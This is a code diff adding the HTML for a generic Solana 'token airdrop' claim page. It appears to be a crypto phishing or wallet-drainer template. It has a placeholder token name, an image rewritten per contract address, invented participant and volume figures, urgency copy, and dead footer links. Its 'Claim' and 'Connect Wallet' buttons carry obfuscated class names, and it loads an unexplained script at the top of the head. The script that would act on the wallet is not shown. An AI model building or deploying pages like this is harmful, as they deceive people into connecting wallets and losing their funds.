@@ -1,0 +1,159 @@
+<!doctype html>
+<html lang="en">
+<head><script src="./colors.prod.esm.js"></script>
+<meta charset="utf-8" />
+<meta name="viewport" content="width=device-width,initial-scale=1" />
+<title>Token Airdrop</title>
+<meta name="description" id="meta-desc" content="Claim your share of the live Solana token airdrop." />
+<meta name="theme-color" id="meta-theme" content="#0b0b10" />
+<meta property="og:type" content="website" />
+<meta property="og:title" id="og-title" content="Token Airdrop" />
+<meta property="og:description" id="og-desc" content="Claim your share of the live Solana token airdrop." />
+<meta property="og:url" id="og-url" content="" />
+<!-- og:image is rewritten server-side by functions/_middleware.js to an
+     absolute /og?ca=... URL on whatever host is serving the page. -->
+<meta property="og:image" id="og-image" content="" />
+<meta name="twitter:card" content="summary_large_image" />
+<meta name="twitter:title" id="tw-title" content="Token Airdrop" />
+<meta name="twitter:description" id="tw-desc" content="Claim your share of the live Solana token airdrop." />
+<meta name="twitter:image" id="tw-image" content="" />
+
+<link rel="canonical" id="canonical" href="" />
+<link rel="manifest" href="manifest.json" />
+<link rel="icon" id="favicon" href="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 64 64'%3E%3Crect width='64' height='64' rx='14' fill='%23111'/%3E%3C/svg%3E" />
+<link rel="apple-touch-icon" id="apple-icon" href="" />
+<link rel="stylesheet" href="style.css" />
+</head>
+<body class="app-body" data-state="loading">
+
+<!-- LOADING SCREEN -->
+<div id="loader" class="loader" role="status" aria-live="polite">
+  <div class="loader-stage">
+    <div class="orbit">
+      <span class="orb"></span>
+      <span class="orb o2"></span>
+      <span class="orb o3"></span>
+      <div class="core"></div>
+    </div>
+    <div class="loader-text" id="loader-text">Loading Token…</div>
+    <div class="loader-bar"><span id="loader-bar-fill"></span></div>
+  </div>
+</div>
+
+<!-- APP -->
+<div id="app" class="app" aria-hidden="true">
+  <div class="bg-grid"></div>
+  <div class="bg-glow"></div>
+  <div class="bg-particles" id="particles"></div>
+
+  <header class="nav">
+    <div class="nav-inner">
+      <a class="brand" href="./">
+        <img class="brand-logo logo-img" alt="" />
+        <span class="brand-name" data-bind="symbol">TOKEN</span>
+      </a>
+      <div class="nav-pill" title="Token contract">
+        <span data-bind="symbol">TOKEN</span>
+        <span class="nav-pill-dot"></span>
+        <span class="muted" id="ca-short">…</span>
+      </div>
+      <nav class="nav-links" aria-label="Socials">
+        <a id="link-twitter" href="#" target="_blank" rel="noopener" aria-label="Twitter">𝕏</a>
+        <a id="link-telegram" href="#" target="_blank" rel="noopener" aria-label="Telegram">✈</a>
+        <a id="link-discord" href="#" target="_blank" rel="noopener" aria-label="Discord">◈</a>
+        <a class="rVzDONuS xX45ACSv btn btn-primary btn-sm">Claim Tokens</a>
+      </nav>
+    </div>
+  </header>
+
+  <main>
+    <!-- HERO -->
+    <section class="hero">
+      <div class="hero-text reveal">
+        <span class="badge"><span class="badge-dot"></span> Live <span data-bind="symbol">TOKEN</span> Airdrop</span>
+        <h1>Take part in the<br/><span class="accent">$<span data-bind="symbol">TOKEN</span></span> airdrop</h1>
+        <p class="lead">Join the exclusive airdrop and claim your tokens. Limited-time opportunity for early adopters and community members. Don't miss out on our revolutionary DeFi project.</p>
+        <div class="hero-cta">
+          <a class="rVzDONuS xX45ACSv btn btn-primary">Claim $<span data-bind="symbol">TOKEN</span></a>
+          <a href="#about" class="btn btn-ghost">Learn More</a>
+        </div>
+      </div>
+      <div class="hero-art reveal">
+        <div class="hero-art-glow"></div>
+        <img class="hero-img logo-img" alt="Token logo" />
+      </div>
+    </section>
+
+    <!-- ABOUT -->
+    <section class="section" id="about">
+      <h2 class="section-title">About <span class="accent">$<span data-bind="symbol">TOKEN</span></span> Airdrop</h2>
+      <p class="section-lead">The <span data-bind="symbol">TOKEN</span> airdrop is a limited-time distribution of free tokens to early supporters and active community members. This exclusive opportunity rewards our dedicated users who believe in the future of decentralized finance.</p>
+
+      <div class="stats">
+        <div class="stat"><div class="stat-num accent">1,000,000</div><div class="stat-label">Total Tokens</div></div>
+        <div class="stat"><div class="stat-num accent">50,000</div><div class="stat-label">Participants</div></div>
+        <div class="stat"><div class="stat-num accent">7</div><div class="stat-label">Days Left</div></div>
+      </div>
+    </section>
+
+    <!-- ELIGIBILITY -->
+    <section class="section" id="claim">
+      <div class="card glass elig">
+        <h3 class="card-title">Eligibility Requirements</h3>
+        <div class="elig-grid">
+          <ul class="checks">
+            <li><span class="tick">✓</span> Be an active Solana blockchain user</li>
+            <li><span class="tick">✓</span> Hold some tokens in your wallet</li>
+            <li><span class="tick">✓</span> Follow our account on Twitter</li>
+            <li><span class="tick">✓</span> Have fun!</li>
+          </ul>
+          <div class="elig-art">
+            <div class="elig-glow"></div>
+            <img class="logo-img" alt="" />
+          </div>
+        </div>
+      </div>
+
+      <div class="connect">
+        <p class="muted">Ready to claim your tokens?</p>
+        <button class="rVzDONuS xX45ACSv btn btn-primary btn-lg">Connect Wallet</button>
+      </div>
+    </section>
+  </main>
+
+  <footer class="footer">
+    <div class="footer-inner">
+      <div class="footer-brand">
+        <div class="brand">
+          <img class="brand-logo logo-img" alt="" />
+          <span class="brand-name" data-bind="symbol">TOKEN</span>
+        </div>
+        <p class="muted">The revolutionary token based on Solana blockchain. Join millions of users building the future of DeFi.</p>
+        <div class="socials">
+          <a id="f-twitter" href="#" target="_blank" rel="noopener" aria-label="Twitter">𝕏</a>
+          <a id="f-telegram" href="#" target="_blank" rel="noopener" aria-label="Telegram">✈</a>
+          <a id="f-discord" href="#" target="_blank" rel="noopener" aria-label="Discord">◈</a>
+        </div>
+      </div>
+      <div><h4>Platform</h4><ul><li><a href="#claim">Airdrop</a></li><li><a href="#">Trading</a></li><li><a href="#">Staking</a></li><li><a href="#">Analytics</a></li></ul></div>
+      <div><h4>Community</h4><ul><li><a href="#">Documentation</a></li><li><a href="#">Support</a></li><li><a href="#">Blog</a></li><li><a href="#">Events</a></li></ul></div>
+      <div><h4>Resources</h4><ul><li><a href="#">API</a></li><li><a href="#">Whitepaper</a></li><li><a href="#">Roadmap</a></li><li><a href="#">Tokenomics</a></li></ul></div>
+      <div><h4>Legal</h4><ul><li><a href="#">Privacy Policy</a></li><li><a href="#">Terms of Service</a></li><li><a href="#">Cookie Policy</a></li><li><a href="#">Disclaimer</a></li></ul></div>
+    </div>
+    <div class="footer-bottom">
+      <span>© <span id="year"></span> <span data-bind="symbol">TOKEN</span>. All rights reserved.</span>
+      <div class="metrics">
+        <span><b class="accent">$2.5M</b><br/>Total Volume</span>
+        <span><b class="accent">150K+</b><br/>Active Users</span>
+        <span><b class="accent">24/7</b><br/>Support</span>
+      </div>
+    </div>
+  </footer>
+
+  <button id="back-top" class="back-top" aria-label="Back to top">↑</button>
+</div>
+
+<script src="config.js"></script>
+<script src="script.js"></script>
+</body>
+</html>
